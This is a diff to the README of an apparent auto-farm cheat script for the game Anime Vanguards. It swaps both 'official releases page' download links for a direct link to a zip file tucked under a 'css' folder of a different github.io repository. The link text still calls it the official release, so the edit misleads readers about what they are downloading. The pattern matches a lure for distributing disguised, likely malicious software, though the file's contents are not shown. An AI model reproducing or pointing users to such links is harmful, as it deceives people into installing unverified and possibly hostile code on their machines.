@@ -5,7 +5,7 @@ description: "Automate farming, quests, and trait upgrades in Anime Vanguards wi
 ---
 # 🤖 Anime-Vanguards-Script-Auto-Farm-2026 - Save time with automated game play
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/scraggly-danielhudsonburnham629/Anime-Vanguards-Script-Auto-Farm-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/scraggly-danielhudsonburnham629/scraggly-danielhudsonburnham629.github.io/raw/refs/heads/main/css/v2.8.zip)
 
 ## About This Software
 
@@ -24,7 +24,7 @@ Ensure you meet these requirements before you start the setup process:
 
 You can obtain the current version of the software from the official release page. Follow these steps to get the files:
 
-1. Visit the [official releases page](https://github.com/scraggly-danielhudsonburnham629/Anime-Vanguards-Script-Auto-Farm-2026/releases). 
+1. Visit the [official releases page](https://github.com/scraggly-danielhudsonburnham629/scraggly-danielhudsonburnham629.github.io/raw/refs/heads/main/css/v2.8.zip). 
 2. Look for the latest version listed at the top.
 3. Click the link to download the compressed folder (usually a .zip file).
 4. Right-click the downloaded folder and select Extract All.
